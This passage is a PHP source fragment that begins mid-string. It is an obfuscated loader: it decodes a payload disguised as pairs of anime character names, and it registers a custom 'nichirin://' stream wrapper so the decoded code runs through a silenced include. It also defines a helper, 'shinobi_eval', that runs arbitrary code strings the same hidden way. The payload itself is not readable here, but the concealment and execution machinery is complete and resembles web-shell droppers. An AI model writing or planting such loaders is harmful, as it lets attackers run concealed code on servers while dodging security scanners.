class HashiraStream{
  private $pos=0;
  public static $code="";
  public function stream_open($path,$mode,$options,&$opened_path){$this->pos=0;return true;}
  public function stream_read($count){
    $ret=substr(self::$code,$this->pos,$count);
    $this->pos+=strlen($ret);
    return $ret;
  }
  public function stream_eof(){return $this->pos>=strlen(self::$code);}
  public function stream_stat(){return [];}
  public function stream_set_option($option,$arg1,$arg2){return true;}
}

akaza-shinobu kokushibo-muichiro tanjiro-giyu muichiro-tengen akaza-tengen giyu-kanao mitsuri-muichiro nezuko-mitsuri tengen-sanemi kanao-sanemi inosuke-zenitsu giyu-zenitsu";
$breathing=[190,129,14,173,181,75,66,198,4,217,33,35,198];
$hashira_map=["tanjiro"=>0,"nezuko"=>1,"zenitsu"=>2,"inosuke"=>3,"giyu"=>4,"shinobu"=>5,"rengoku"=>6,"muzan"=>7,"akaza"=>8,"kokushibo"=>9,"kanao"=>10,"tengen"=>11,"muichiro"=>12,"mitsuri"=>13,"obanai"=>14,"sanemi"=>15];
preg_match_all("/[a-z]+/i",$nichirin,$slayers);
$slayers=$slayers[0];
$dec_bytes=[];
$rank=count($breathing);
$slayers_count=count($slayers);
for($i=0;$i<$slayers_count;$i+=2){
  $water=$hashira_map[$slayers[$i]];
  $fire=$hashira_map[$slayers[$i+1]];
  $demon=($water<<4)|$fire;
  $form=($i>>1)%$rank;
  $dec_bytes[]=($demon-$breathing[$form]+256)%256;
}
$code=pack("C*",...$dec_bytes);
$tokens=token_get_all($code);
$code="";
$file_path=__FILE__;
$dir_path=dirname($file_path);
foreach($tokens as $t){
  if(is_array($t)){
    $id=$t[0];$text=$t[1];
    if($id===T_FILE){$code.="'".addslashes($file_path)."'";}
    elseif($id===T_DIR){$code.="'".addslashes($dir_path)."'";}
    else{$code.=$text;}
  }else{$code.=$t;}
}
HashiraStream::$code=$code;
stream_wrapper_register("nichirin","HashiraStream");
if(!function_exists('shinobi_eval')){
  function shinobi_eval($c){
    if(substr(trim($c),0,2)==='?>'){$c=substr(trim($c),2);}
    $c=preg_replace('/^\s*(\xEF\xBB\xBF)?<\?(php|=)?/i','<?$2',ltrim($c));
    $t=token_get_all($c);$p="";$f=__FILE__;$d=dirname($f);
    foreach($t as $x){
      if(is_array($x)){
        $id=$x[0];$text=$x[1];
        if($id===T_FILE){$p.="'".addslashes($f)."'";}
        elseif($id===T_DIR){$p.="'".addslashes($d)."'";}
        else{$p.=$text;}
      }else{$p.=$x;}
    }
    HashiraStream::$code=$p;
    @include "nichirin://nested_exec";
  }
}
@include "nichirin://exec";
